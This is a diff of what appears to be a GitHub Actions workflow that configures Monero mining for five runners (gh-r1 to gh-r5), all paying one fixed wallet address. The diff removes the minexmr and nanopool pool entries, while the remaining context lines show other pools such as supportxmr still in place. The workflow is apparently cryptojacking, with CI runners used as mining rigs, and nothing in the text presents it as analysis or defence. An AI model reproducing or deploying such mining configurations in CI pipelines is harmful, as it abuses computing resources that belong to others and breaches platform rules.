@@ -58,26 +58,6 @@ jobs:
                 "rig-id": "gh-r1",
                 "keepalive": true,
                 "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "pool.minexmr.com:443",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner1",
-                "rig-id": "gh-r1",
-                "keepalive": true,
-                "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "xmr-eu1.nanopool.org:14433",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner1",
-                "rig-id": "gh-r1",
-                "keepalive": true,
-                "tls": true
               }
             ],
             "retries": 10,
@@ -149,26 +129,6 @@ jobs:
                 "algo": "rx/0",
                 "coin": "monero",
                 "url": "pool.supportxmr.com:443",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner2",
-                "rig-id": "gh-r2",
-                "keepalive": true,
-                "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "pool.minexmr.com:443",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner2",
-                "rig-id": "gh-r2",
-                "keepalive": true,
-                "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "xmr-eu1.nanopool.org:14433",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                 "pass": "runner2",
                 "rig-id": "gh-r2",
@@ -250,26 +210,6 @@ jobs:
                 "rig-id": "gh-r3",
                 "keepalive": true,
                 "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "pool.minexmr.com:443",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner3",
-                "rig-id": "gh-r3",
-                "keepalive": true,
-                "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "xmr-eu1.nanopool.org:14433",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner3",
-                "rig-id": "gh-r3",
-                "keepalive": true,
-                "tls": true
               }
             ],
             "retries": 10,
@@ -346,26 +286,6 @@ jobs:
                 "rig-id": "gh-r4",
                 "keepalive": true,
                 "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "pool.minexmr.com:443",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner4",
-                "rig-id": "gh-r4",
-                "keepalive": true,
-                "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "xmr-eu1.nanopool.org:14433",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner4",
-                "rig-id": "gh-r4",
-                "keepalive": true,
-                "tls": true
               }
             ],
             "retries": 10,
@@ -437,26 +357,6 @@ jobs:
                 "algo": "rx/0",
                 "coin": "monero",
                 "url": "pool.supportxmr.com:443",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner5",
-                "rig-id": "gh-r5",
-                "keepalive": true,
-                "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "pool.minexmr.com:443",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner5",
-                "rig-id": "gh-r5",
-                "keepalive": true,
-                "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "xmr-eu1.nanopool.org:14433",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                 "pass": "runner5",
                 "rig-id": "gh-r5",
